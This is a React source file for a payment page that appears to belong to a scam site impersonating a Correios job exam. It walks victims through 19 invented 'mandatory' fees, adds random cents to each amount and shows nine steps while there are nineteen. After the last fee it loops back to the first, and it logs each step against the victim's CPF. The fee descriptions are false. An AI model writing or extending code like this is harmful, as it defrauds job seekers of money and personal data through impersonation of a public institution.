import { useEffect, useMemo } from "react";
import { useNavigate, useLocation, useParams } from "react-router-dom";
import CorreiosHeader from "@/components/CorreiosHeader";
import CorreiosFooter from "@/components/CorreiosFooter";
import UpsellStep from "@/components/UpsellStep";
import { CPFData } from "@/lib/cpf";
import { getSession, saveSession } from "@/hooks/useSessionPersistence";

import { trackFunnelEvent } from "@/hooks/useFunnelTracking";
import { buildUrlWithUtm } from "@/hooks/useUtmTracking";

const UPSELLS = [
  { valor: 47, title: "Confirmação da Inscrição", description: "Sua inscrição precisa ser confirmada. O pagamento desta taxa é obrigatório para garantir sua vaga no concurso." },
  { valor: 37, title: "Confirmação do Local da Prova", description: "O pagamento desta taxa é obrigatório para confirmar o local de prova mais próximo de você." },
  { valor: 39, title: "Cartão de Acesso à Prova", description: "O pagamento desta taxa é obrigatório. Sem o cartão de acesso, você não entra na sala de prova." },
  { valor: 27, title: "Seguro do Candidato", description: "Taxa obrigatória de proteção. Se o concurso for cancelado, você recebe todo o dinheiro de volta." },
  { valor: 33, title: "Apostila Digital Oficial", description: "Taxa obrigatória. Material completo com todo o conteúdo que cai na prova, elaborado pela banca." },
  { valor: 24, title: "Simulado Online da Banca", description: "Taxa obrigatória. Simulado no mesmo formato da prova real para você se preparar adequadamente." },
  { valor: 15, title: "Acompanhamento por SMS e E-mail", description: "Taxa obrigatória. Receba todas as atualizações sobre datas, locais e resultados do concurso." },
  { valor: 19, title: "Certificado de Pré-Aprovação", description: "Taxa obrigatória. Documento que comprova que você cumpriu todos os requisitos do edital." },
  { valor: 19, title: "Taxa de Homologação Documental", description: "Taxa obrigatória. Homologação dos documentos apresentados na inscrição conforme exigências do edital." },
  { valor: 24, title: "Garantia de Vaga na Região", description: "Taxa obrigatória. Garante que se aprovado, você trabalha na unidade dos Correios mais perto da sua casa." },
  { valor: 27, title: "Taxa de Material Didático Oficial", description: "Taxa obrigatória. Acesso ao material didático oficial elaborado pela banca organizadora do concurso." },
  { valor: 22, title: "Taxa de Protocolo de Recurso", description: "Taxa obrigatória. Protocolo administrativo para interposição de recursos junto à banca examinadora." },
  { valor: 17, title: "Taxa de Retificação do Edital", description: "Taxa obrigatória. Receba imediatamente qualquer retificação oficial do edital — datas, conteúdos e vagas." },
  { valor: 24, title: "Taxa de Processamento Prioritário", description: "Taxa obrigatória. Processamento prioritário da sua prova com resultado em até 48 horas." },
  { valor: 15, title: "Taxa de Validação de Escolaridade", description: "Taxa obrigatória. Validação do certificado escolar exigido para a posse no cargo." },
  { valor: 14, title: "Taxa de Comunicação Oficial", description: "Taxa obrigatória. Receba todas as comunicações oficiais do concurso por SMS e e-mail." },
  { valor: 18, title: "Taxa de Garantia de Aplicação", description: "Taxa obrigatória. Garantia administrativa em caso de impedimento no dia da aplicação da prova." },
  { valor: 28, title: "Taxa de Orientação ao Candidato", description: "Taxa obrigatória. Orientação individualizada sobre o processo seletivo e preparação para a prova." },
  { valor: 21, title: "Taxa de Habilitação para Posse", description: "Taxa obrigatória. Habilitação documental e administrativa para o processo de posse no cargo." },
];

const Upsell = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { step } = useParams<{ step: string }>();

  const parsedStep = parseInt(step || "1", 10);
  const stepNumber = isNaN(parsedStep) ? 1 : Math.min(Math.max(parsedStep, 1), 19);
  const currentIndex = stepNumber - 1;
  const currentUpsell = UPSELLS[currentIndex];

  const valorComCentavos = useMemo(() => currentUpsell.valor + (Math.floor(Math.random() * 99) + 1) / 100, [stepNumber, currentUpsell.valor]);

  const session = getSession();
  const cpfData: CPFData | undefined = location.state?.cpfData || session?.cpfData;
  const valorBeneficio: number | undefined = location.state?.valorBeneficio || session?.valorBeneficio;
  const protocolo: string | undefined = location.state?.protocolo || session?.protocolo;

  useEffect(() => { window.scrollTo(0, 0); }, [stepNumber]);

  useEffect(() => {
    if (!cpfData) { navigate("/"); return; }
    saveSession({ cpfData, currentStep: `/upsell/${stepNumber}`, valorBeneficio, protocolo });
    trackFunnelEvent(`upsell-${stepNumber}`, { cpf: cpfData.cpf });
  }, [cpfData, valorBeneficio, protocolo, navigate, stepNumber]);

  const handlePaymentConfirmed = () => {
    const stateData = { cpfData, valorBeneficio, protocolo };
    if (stepNumber < 19) {
      navigate(buildUrlWithUtm(`/upsell-info/${stepNumber + 1}`), { state: stateData });
    } else {
      navigate(buildUrlWithUtm("/upsell/1"), { state: stateData });
    }
  };

  if (!cpfData) return null;

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <CorreiosHeader breadcrumb={`Concursos > Atendente Comercial > ${currentUpsell.title}`} />

      <main className="flex-1 flex items-center justify-center px-4 py-6 sm:py-8">
        <UpsellStep
          key={stepNumber}
          title={currentUpsell.title}
          description={currentUpsell.description}
          valor={valorComCentavos}
          cpfData={cpfData}
          protocolo={protocolo || `ECT${Date.now()}`}
          onPaymentConfirmed={handlePaymentConfirmed}
          stepNumber={stepNumber}
          totalSteps={9}
        />
      </main>

      <CorreiosFooter />
    </div>
  );
};

export default Upsell;
